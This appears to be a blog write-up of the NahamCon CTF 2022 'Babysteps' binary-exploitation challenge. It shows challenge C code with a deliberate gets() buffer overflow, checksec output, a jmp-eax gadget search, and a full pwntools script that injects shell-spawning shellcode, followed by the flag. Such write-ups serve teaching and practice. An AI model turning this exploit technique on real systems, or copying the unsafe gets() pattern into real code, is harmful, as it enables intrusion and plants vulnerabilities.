---
title: "[NAHAMCONCTF] Babysteps"
excerpt_separator: <!--more-->
categories:
  - CTF
tags:
  - NAHAMCONCTF
  - PWN
  - "2022"
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

# Task source:
https://github.com/Tzion0/CTF/tree/master/NahamConCTF/2022/Binary_Exploitation/Babysteps

# Description
Become a baby! Take your first steps and jump around with BABY SIMULATOR 9000!

This challenge provided a C source code and its binary.

<!--more-->

The C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>


#define BABYBUFFER 16

void setup(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
}

void whine() {
  puts("You whine: 'WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH'\n");
}

void scream() {
  puts("You scream: 'WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH'\n");
}

void cry() {
  puts("You cry: 'WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH'\n");
}

void sleep() {
  puts("Night night, baby!\n");
  exit(-1);
}


void ask_baby_name() {
  char buffer[BABYBUFFER];
  puts("First, what is your baby name?");
  return gets(buffer);
}

int main(int argc, char **argv){
  setup();

  puts("              _)_");
  puts("           .-'(/ '-.");
  puts("          /    `    \\");
  puts("         /  -     -  \\");
  puts("        (`  a     a  `)");
  puts("         \\     ^     /");
  puts("          '. '---' .'");
  puts("          .-`'---'`-.");
  puts("         /           \\");
  puts("        /  / '   ' \\  \\");
  puts("      _/  /|       |\\  \\_");
  puts("     `/|\\` |+++++++|`/|\\`");
  puts("          /\\       /\\");
  puts("          | `-._.-` |");
  puts("          \\   / \\   /");
  puts("          |_ |   | _|");
  puts("          | _|   |_ |");
  puts("          (ooO   Ooo)");
  puts("");

  puts("=== BABY SIMULATOR 9000 ===");

  puts("How's it going, babies!!");
  puts("Are you ready for the adventure of a lifetime? (literally?)");
  puts("");
  ask_baby_name();

  puts("Pefect! Now let's get to being a baby!\n");

  char menu_option;

  do{

    puts("CHOOSE A BABY ACTIVITY");
    puts("a. Whine");
    puts("b. Cry");
    puts("c. Scream");
    puts("d. Throw a temper tantrum");
    puts("e. Sleep.");
    scanf(" %c",&menu_option);

    switch(menu_option){

      case 'a':
        whine();
        break;
      case 'b':
        cry();
        break;
      case 'c':
        scream();
        break;
      case 'd':
        scream();
        cry();
        whine();
        cry();
        scream();
        break;
      case 'e':
        sleep();
        break;

      default:
        puts("WAAAAAAHHHH, THAT NO-NO!!!\n");
        break;
    }

  }while(menu_option !='e');

}
```

Looking at the source code, we can see there is a BOF vulnerability lies at a function called `ask_baby_name`:
```c
void ask_baby_name() {
  char buffer[BABYBUFFER];
  puts("First, what is your baby name?");
  return gets(buffer);
}
```

It asking for the baby name using `gets()` function which is insecure and the size of the buffer was set to 16 bytes which can be see here:
```c
#define BABYBUFFER 16
```

## Exploitation
First, we need to check any protections in this binary, we can use `checksec` for that, the result is:
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

From the output we can see it was a 32-bit binary and NX is disabled means that we can execute shellcode in the binary. The next step is we find the offset before overflowing the return function as we need to jmp to the shellcode we specify later, we use Cyclic for that and the offset was 28.

The next step we need to know is where and how we jump to. While debugging, we found that our provided input will be storing in EAX, which can be seen in the picture below:

![IMG](/assets/images/nahamconctf2022-babysteps/nahamcon-pwn.png)

With that being said, now we just need to find gadget to jmp to EAX, we can use `ropper` do that:
```
ropper -f babysteps --search jmp
```

![IMG](/assets/images/nahamconctf2022-babysteps/nahamcon-pwn2.png)

With all of the information we gathered, the final exploit script is:
```py
from pwn import *

exe = './babysteps'
elf = context.binary = ELF(exe, checksec=False)

# Start program
#io = remote("challenge.nahamcon.com",31983)
io = process(exe)

offset = 28

shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())

jmp_eax = asm('jmp eax')
jmp_eax = next(elf.search(jmp_eax))

# Build payload
payload = flat([
    b"\x90"*offset,
    jmp_eax,
    shellcode,
])

write('payload', payload)
# Send the payload
io.recvuntil(b"name?\n")
io.sendline(payload)

# Get our shell
io.interactive()
```

From script above we basically use `shellcraft` to generate shellcode to spawn shell for us. For the payload structure, since this is 32-bit binary, we first overflow to the return function with NOP ("\x90"), then jmp_eax which means jump to the NOP we provided earlier, and the shellcode was after the NOP, hence it get executed.

Result:

![IMG](/assets/images/nahamconctf2022-babysteps/nahamcon-pwn3.png)

Flag:
```
flag{7d4ce4594f7511f8d7d6d0b1edd1a162}
```